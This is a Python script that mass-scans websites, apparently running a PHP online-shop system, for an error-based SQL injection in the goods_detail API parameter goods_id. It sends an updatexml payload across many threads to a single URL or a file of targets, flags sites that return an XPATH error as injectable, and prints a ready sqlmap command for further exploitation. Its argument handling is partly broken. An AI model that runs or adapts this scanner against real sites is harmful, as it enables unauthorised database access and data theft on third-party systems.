"""
Author:adminsec5247
Date:2021-9-29
Last Edit:2021-9-29
Version:v1.0
payload来源：https://blog.csdn.net/weixin_42633229/article/details/117070546
"""

import argparse
import requests
import urllib3
from lxml import etree
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61'
}

Payload = "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1)"
description = "Please use a valid parameter"
parser = argparse.ArgumentParser(description=description)
parser.add_argument('-u', type=str, help="Target URL", dest="url")
parser.add_argument('-f', type=str, help="Targets File Path", dest="File_Path")
parser.add_argument('-thread', type=int, help="Number of threads", dest="thread", default=10)
args = parser.parse_args()
thread_num = args.thread
file = args.File_Path
Key = "XPATH syntax error"
url_list = []


def url_check():
    url = str(args.url) + Payload
    response = requests.get(url=url, headers=header, verify=False).text
    tree = etree.HTML(response)
    key_str = tree.xpath('//div[@class="error"]/h1/text()')[0]
    if Key in key_str:
        print(str(args.url) + "存在SQL注入!")
        print("SqlMap快捷语句：python3 sqlmap.py -u " + str(args.url) + "index.php?s=api/goods_detail&goods_id=1 -p goods_id --random-agent")


def load_file():
    with open(file, "r") as f:
        lines = f.readlines()
        for line in lines:
            url_list.append(line.strip())


def urls_check(line):
    url = line + Payload
    requests.packages.urllib3.disable_warnings()
    response = requests.get(url=url, headers=header, verify=False).text
    tree = etree.HTML(response)
    key_str = tree.xpath('//div[@class="error"]/h1/text()')
    if len(key_str) != 0:
        if Key in key_str[0]:
            print(line + "存在SQL注入!")


def run():
    if args.url != '' and args.File_Path == '':
        url_list
    elif args.url == '' and args.File_Path != '':
        load_file()
        pool = Pool(thread_num)
        pool.map(urls_check, url_list)
    else:
        print("-u 和 -f 参数至少/多选择一个")
        exit()


if __name__ == '__main__':
    run()
